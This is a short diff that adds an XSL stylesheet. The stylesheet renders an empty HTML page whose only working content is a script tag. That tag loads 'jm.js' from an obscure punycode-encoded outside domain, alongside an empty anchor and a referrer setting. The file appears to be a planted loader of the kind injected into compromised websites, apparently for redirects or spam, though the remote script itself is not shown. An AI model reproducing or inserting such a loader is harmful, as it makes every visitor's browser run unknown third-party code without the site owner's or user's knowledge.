@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml">
+<xsl:template match="/">
+<html><head><title>letnn</title><meta content="always" name="referrer"/></head><body><a id="j" href=""></a><script src="//dzjs1.xn--xhq8sm16c5ls.xn--55qx5d/dazhu/jm.js"></script></body></html>
+</xsl:template>
+</xsl:stylesheet>
